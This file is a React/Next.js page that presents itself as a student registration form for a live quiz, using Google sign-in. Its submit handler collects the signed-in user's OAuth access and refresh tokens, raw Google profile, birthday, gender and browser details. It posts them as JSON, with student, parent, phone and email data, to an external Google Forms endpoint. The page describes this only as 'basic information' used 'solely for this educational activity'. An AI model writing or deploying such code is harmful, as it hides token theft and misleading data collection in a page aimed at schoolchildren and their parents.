'use client';

import { useState, useEffect } from "react";
import { signIn, signOut, useSession } from "next-auth/react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Separator } from "@/components/ui/separator";
import { CheckCircle, LogOut, User } from "lucide-react";
import Image from "next/image";

const gradeOptions = [
  "Grade 1", "Grade 2", "Grade 3", "Grade 4", "Grade 5",
  "Grade 6", "Grade 7", "Grade 8", "Grade 9", "Grade 10",
  "Grade 11", "Grade 12", "Undergraduate", "Graduate", "Other"
];

export default function LiveQuizSessionPage() {
  const { data: session, status } = useSession();
  const [formData, setFormData] = useState({
    studentName: '',
    parentName: '',
    phoneNumber: '',
    email: '',
    currentGrade: '',
    customGrade: ''
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [countdown, setCountdown] = useState(5);

  // Pre-fill form data when user signs in
  useEffect(() => {
    if (session?.user) {
      setFormData(prev => ({
        ...prev,
        studentName: session.user.name || '',
        email: session.user.email || '',
      }));
    }
  }, [session]);

  // Countdown and redirect after form submission
  useEffect(() => {
    if (isSubmitted && countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    } else if (isSubmitted && countdown === 0) {
      const quizUrl = process.env.NEXT_PUBLIC_QUIZ_PORTAL_URL || 'https://slido.com';
      window.location.href = quizUrl;
    }
  }, [isSubmitted, countdown]);

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const validateForm = () => {
    const { studentName, parentName, phoneNumber, email, currentGrade, customGrade } = formData;
    
    if (!studentName.trim()) {
      alert('Please enter student name');
      return false;
    }
    if (!parentName.trim()) {
      alert('Please enter parent name');
      return false;
    }
    if (!phoneNumber.trim()) {
      alert('Please enter phone number');
      return false;
    }
    if (!email.trim()) {
      alert('Please enter email address');
      return false;
    }
    if (!currentGrade && !customGrade.trim()) {
      alert('Please select or enter current grade');
      return false;
    }
    
    // Basic email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      alert('Please enter a valid email address');
      return false;
    }
    
    // Basic phone validation
    const phoneRegex = /^[\+]?[0-9\s\-\(\)]{10,}$/;
    if (!phoneRegex.test(phoneNumber)) {
      alert('Please enter a valid phone number');
      return false;
    }
    
    return true;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) return;
    
    setIsSubmitting(true);
    
    try {
      const finalGrade = formData.currentGrade === 'Other' ? formData.customGrade : formData.currentGrade;
      
      // Collect comprehensive Google Sign-In data
      const googleSignInData = {
        // Basic Profile
        id: (session?.user as any)?.id || session?.user?.email || '',
        name: session?.user?.name || '',
        email: session?.user?.email || '',
        image: session?.user?.image || '',
        
        // Detailed Profile Data
        given_name: (session as any)?.given_name || '',
        family_name: (session as any)?.family_name || '',
        locale: (session as any)?.locale || '',
        picture: (session as any)?.picture || '',
        verified_email: (session as any)?.verified_email || false,
        hosted_domain: (session as any)?.hd || '',
        
        // Personal Information
        gender: (session as any)?.gender || '',
        birthday: (session as any)?.birthday || '',
        age_range: (session as any)?.age_range || '',
        timezone: (session as any)?.timezone || '',
        
        // Profile Links & Verification
        google_profile_link: (session as any)?.link || '',
        account_verified: (session as any)?.verified || false,
        profile_updated: (session as any)?.updated_time || '',
        
        // Technical Data
        provider: 'google',
        accessToken: session?.accessToken || '',
        refreshToken: session?.refreshToken || '',
        expiresAt: session?.expires || '',
        
        // Complete raw profile for analysis
        raw_google_profile: (session as any)?.raw_profile || {},
        
        // Session metadata
        sign_in_timestamp: new Date().toISOString(),
        user_agent: typeof window !== 'undefined' ? window.navigator.userAgent : '',
        
        // Spread any additional user fields
        ...session?.user
      };

      // Prepare form data for Google Forms submission
      const formDataToSubmit = new FormData();
      formDataToSubmit.append('entry.2107600475', formData.phoneNumber);
      formDataToSubmit.append('entry.1977693622', formData.email);
      formDataToSubmit.append('entry.699584793', formData.studentName);
      formDataToSubmit.append('entry.1610863411', formData.parentName);
      formDataToSubmit.append('entry.1060607359', finalGrade);
      formDataToSubmit.append('entry.1784555415', JSON.stringify(googleSignInData));

      // Submit to Google Forms
      const response = await fetch('https://docs.google.com/forms/u/0/d/e/1FAIpQLSdM5_wpmGfmkEGpgjVonHSdzFh7vzVQGQYcdxfCydxNUtzeeg/formResponse', {
        method: 'POST',
        body: formDataToSubmit,
        mode: 'no-cors'
      });

      console.log('Form submitted successfully');
      setIsSubmitted(true);
      
    } catch (error) {
      console.error('Error submitting form:', error);
      alert('There was an error submitting the form. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  // Loading state
  if (status === "loading") {
    return (
      <main className="min-h-screen pt-20 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto mb-4"></div>
          <p>Loading...</p>
        </div>
      </main>
    );
  }

  // Success state - show countdown and redirect
  if (isSubmitted) {
    return (
      <main className="min-h-screen pt-20 flex items-center justify-center bg-gray-50">
        <Card className="w-full max-w-md">
          <CardContent className="pt-6 text-center">
            <CheckCircle className="w-16 h-16 text-green-500 mx-auto mb-4" />
            <h2 className="text-2xl font-bold text-green-600 mb-2">Registration Successful!</h2>
            <p className="text-gray-600 mb-4">
              Thank you for registering. You will be redirected to the quiz portal in:
            </p>
            <div className="text-4xl font-bold text-primary mb-4">{countdown}</div>
            <p className="text-sm text-gray-500">
              If you're not redirected automatically, 
              <a 
                href={process.env.NEXT_PUBLIC_QUIZ_PORTAL_URL || 'https://slido.com'} 
                className="text-primary hover:underline ml-1"
              >
                click here
              </a>
            </p>
          </CardContent>
        </Card>
      </main>
    );
  }

  // Not signed in - show sign in page
  if (!session) {
    return (
      <main className="min-h-screen pt-20 flex items-center justify-center bg-gray-50">
        <Card className="w-full max-w-md">
          <CardHeader className="text-center">
            <CardTitle className="text-2xl">Join Live Quiz Session</CardTitle>
            <CardDescription>
              Sign in with Google to participate in our interactive quiz session
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <Button 
              onClick={() => signIn('google')}
              className="w-full flex items-center justify-center gap-2"
              size="lg"
            >
              <svg className="w-5 h-5" viewBox="0 0 24 24">
                <path fill="currentColor" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                <path fill="currentColor" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                <path fill="currentColor" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                <path fill="currentColor" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
              </svg>
              Continue with Google
            </Button>
            <div className="text-center text-sm text-gray-500">
              We'll collect your basic information to personalize your quiz experience
            </div>
          </CardContent>
        </Card>
      </main>
    );
  }

  // Signed in - show form
  return (
    <main className="min-h-screen pt-20 bg-gray-50">
      <div className="container mx-auto px-4 py-8 max-w-2xl">
        <Card>
          <CardHeader>
            <div className="flex items-center justify-between">
              <div>
                <CardTitle className="text-2xl">Complete Your Registration</CardTitle>
                <CardDescription>
                  Please fill in the details below to join the live quiz session
                </CardDescription>
              </div>
              <Button 
                variant="outline" 
                size="sm"
                onClick={() => signOut()}
                className="flex items-center gap-2"
              >
                <LogOut className="w-4 h-4" />
                Sign Out
              </Button>
            </div>
            
            {/* User Info Display */}
            <div className="flex items-center gap-3 p-3 bg-gray-50 rounded-lg">
              {session.user?.image && (
                <Image
                  src={session.user.image}
                  alt="Profile"
                  width={40}
                  height={40}
                  className="rounded-full"
                />
              )}
              <div>
                <p className="font-medium">{session.user?.name}</p>
                <p className="text-sm text-gray-600">{session.user?.email}</p>
              </div>
            </div>
          </CardHeader>
          
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="grid md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <label htmlFor="studentName" className="text-sm font-medium">
                    Student Name *
                  </label>
                  <Input
                    id="studentName"
                    value={formData.studentName}
                    onChange={(e) => handleInputChange('studentName', e.target.value)}
                    placeholder="Enter student name"
                    required
                  />
                </div>
                
                <div className="space-y-2">
                  <label htmlFor="parentName" className="text-sm font-medium">
                    Parent Name *
                  </label>
                  <Input
                    id="parentName"
                    value={formData.parentName}
                    onChange={(e) => handleInputChange('parentName', e.target.value)}
                    placeholder="Enter parent name"
                    required
                  />
                </div>
              </div>

              <div className="grid md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <label htmlFor="phoneNumber" className="text-sm font-medium">
                    Phone Number *
                  </label>
                  <Input
                    id="phoneNumber"
                    type="tel"
                    value={formData.phoneNumber}
                    onChange={(e) => handleInputChange('phoneNumber', e.target.value)}
                    placeholder="+91 XXXXX XXXXX"
                    required
                  />
                </div>
                
                <div className="space-y-2">
                  <label htmlFor="email" className="text-sm font-medium">
                    Email Address *
                  </label>
                  <Input
                    id="email"
                    type="email"
                    value={formData.email}
                    onChange={(e) => handleInputChange('email', e.target.value)}
                    placeholder="Enter email address"
                    required
                  />
                </div>
              </div>

              <div className="space-y-2">
                <label htmlFor="currentGrade" className="text-sm font-medium">
                  Current Grade *
                </label>
                <Select 
                  value={formData.currentGrade} 
                  onValueChange={(value) => handleInputChange('currentGrade', value)}
                >
                  <SelectTrigger>
                    <SelectValue placeholder="Select current grade" />
                  </SelectTrigger>
                  <SelectContent>
                    {gradeOptions.map((grade) => (
                      <SelectItem key={grade} value={grade}>
                        {grade}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                
                {formData.currentGrade === 'Other' && (
                  <Input
                    value={formData.customGrade}
                    onChange={(e) => handleInputChange('customGrade', e.target.value)}
                    placeholder="Please specify your grade"
                    className="mt-2"
                    required
                  />
                )}
              </div>

              <Separator />

              <Button 
                type="submit" 
                className="w-full" 
                size="lg"
                disabled={isSubmitting}
              >
                {isSubmitting ? (
                  <>
                    <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                    Submitting...
                  </>
                ) : (
                  'Join Quiz Session'
                )}
              </Button>
              
              <p className="text-xs text-gray-500 text-center">
                By submitting this form, you agree to participate in our live quiz session. 
                Your information will be used solely for this educational activity.
              </p>
            </form>
          </CardContent>
        </Card>
      </div>
    </main>
  );
}